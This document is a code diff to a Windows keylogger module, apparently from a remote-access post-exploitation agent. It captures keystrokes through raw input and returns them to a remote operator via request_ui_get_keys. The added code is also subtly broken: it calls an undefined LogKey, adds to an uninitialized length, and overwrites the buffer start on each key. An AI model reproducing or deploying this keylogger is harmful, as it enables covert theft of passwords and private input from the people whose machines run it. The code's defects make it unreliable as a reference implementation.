@@ -43,89 +43,26 @@ typedef enum { false=0, true=1 } bool;
 bool boom[1024];
 const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
-char *KeyScanBuff = NULL;
+char *key_scan_buf = NULL;
+unsigned int lenKeyScanBuff = 0;
 int KeyScanSize = 1024*1024;
 int KeyScanIndex = 0;
-
-void ui_keyscan_now(bool listStates[2][256], bool *iToggle) {
-    unsigned int iKey = 0;
-
-	TCHAR strLog[8] = {0};
-    for (iKey = 0; iKey < 255; ++iKey)
-    {
-		bool bPrior, bState;
-		DWORD tog = *iToggle;
-        SHORT iState = GetAsyncKeyState(iKey);
-        listStates[tog][iKey] = iState < 0;
-		bPrior = listStates[!tog][iKey];
-        bState = listStates[tog][iKey];
-
-        // detect state change
-        if (bPrior ^ bState && bState == 1)
-        {
-			unsigned char flags = (1<<0);
-
-			TCHAR toHex[] = _T("0123456789ABCDEF");
-            bool bShift = listStates[tog][VK_SHIFT];
-            bool bCtrl = listStates[tog][VK_CONTROL];
-            bool bAlt = listStates[tog][VK_MENU];
-/*
-			strLog[0] = bShift ? 'S' : 's';
-			strLog[1] = bCtrl  ? 'C' : 'c';
-			strLog[2] = bAlt   ? 'A' : 'a';
-			strLog[3] = toHex[(iKey >> 4) & 0xF];
-			strLog[4] = toHex[(iKey & 0xF)];
-			strLog[5] = ';';
-			strLog[6] = '\r';
-			strLog[6] = '\n';
-			OutputDebugString(strLog);
-*/
-			if(bShift) flags |= (1<<1);
-			if(bCtrl)  flags |= (1<<2);
-			if(bAlt)   flags |= (1<<3);
-
-			if(KeyScanIndex >= KeyScanSize) KeyScanIndex = 0;
-			KeyScanBuff[KeyScanIndex+0] = flags;
-			KeyScanBuff[KeyScanIndex+1] = iKey;
-			KeyScanIndex += 2;
-        }
-    }
-    *iToggle = !*iToggle;
-}
-
-void ui_keyscan_proc(void) {
-    bool iToggle = false;
-    bool listStates[2][256] = {0};
-
-	if(KeyScanBuff) {
-		free(KeyScanBuff);
-		KeyScanBuff = NULL;
-		KeyScanIndex = 0;
-	}
-
-	KeyScanBuff = calloc(KeyScanSize, sizeof(char));
-	while(1) {
-		ui_keyscan_now(listStates, &iToggle);
-		Sleep(30);
-	}
-}
-
 
 
 /*
  *  key logger updates begin here
  */
 
-int WINAPI ui_keylog_proc()
+int WINAPI ui_keyscan_proc()
 {
-    WNDCLASSEX klwc;
+WNDCLASSEX klwc;
     HWND hwnd;
     MSG msg;
 
     // register window class
     ZeroMemory(&klwc, sizeof(WNDCLASSEX));
     klwc.cbSize        = sizeof(WNDCLASSEX);
-    klwc.lpfnWndProc   = ui_keylog_wndproc;
+    klwc.lpfnWndProc   = ui_keyscan_wndproc;
     klwc.hInstance     = hAppInstance;
     klwc.lpszClassName = g_szClassName;
     
@@ -134,6 +71,15 @@ int WINAPI ui_keylog_proc()
         return 0;
     }
     
+    // initialize key_scan_buf
+    if(key_scan_buf) {
+        free(key_scan_buf);
+        key_scan_buf = NULL;
+        KeyScanIndex = 0;
+    }
+
+    key_scan_buf = calloc(KeyScanSize, sizeof(char));
+
     // create message-only window
     hwnd = CreateWindowEx(
         0,
@@ -159,7 +105,7 @@ int WINAPI ui_keylog_proc()
     return msg.wParam;
 }
 
-LRESULT CALLBACK ui_keylog_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     UINT dwSize;
     RAWINPUTDEVICE rid;
@@ -167,7 +113,7 @@ LRESULT CALLBACK ui_keylog_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lP
     
     switch(msg)
     {
-    	// register raw input device
+        // register raw input device
         case WM_CREATE:
             rid.usUsagePage = 0x01;
             rid.usUsage = 0x06;
@@ -194,7 +140,7 @@ LRESULT CALLBACK ui_keylog_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lP
                 if(buffer->header.dwType == RIM_TYPEKEYBOARD
                     && buffer->data.keyboard.Message == WM_KEYDOWN)
                 {
-                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
+                    if(LogKey(buffer->data.keyboard.VKey) == -1)
                         DestroyWindow(hwnd);
                 }
             }
@@ -268,8 +214,8 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	
 	if(tKeyScan) {
 		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
-		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, KeyScanBuff);
-		memset(KeyScanBuff, 0, KeyScanSize);
+		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, key_scan_buf);
+		memset(key_scan_buf, 0, KeyScanSize);
 		KeyScanIndex = 0;
 	} else {
 		result = 1;
@@ -289,14 +235,11 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 
 int ui_log_key(UINT vKey)
 {
-    DWORD dwWritten;
     BYTE lpKeyboard[256];
     char szKey[32];
     WORD wKey;
-    char buf[32];
     int len;
-        
-    // Convert virtual-key to ascii
+
     GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
     GetKeyboardState(lpKeyboard);
     
@@ -304,29 +247,23 @@ int ui_log_key(UINT vKey)
     switch(vKey)
     {
         case VK_BACK:
-            len = wsprintf(buf, "[BP]");
+            len += wsprintf(key_scan_buf, "[BP]");
             break;
         case VK_RETURN:
             len = 2;
-            strcpy(buf, "\r\n");
+            strcpy(key_scan_buf, "\r\n");
             break;
         case VK_SHIFT:
             break;
         default:
-            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1)
-                len = wsprintf(buf, "%c", (char)wKey);
-            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0)
-                len = wsprintf(buf, "[%s]", szKey);
+            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1) {
+                len = wsprintf(key_scan_buf, "%c", (char)wKey);
+            }
+            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0) {
+                len = wsprintf(key_scan_buf, "[%s]", szKey);
+            }
             break;
     }
-
-    // Write buf into the log
-    if(len > 0)
-    {
-        if(!WriteFile(hLog, buf, len, &dwWritten, NULL))
-            return -1;
-    }
-        
     return 0;
 }
 
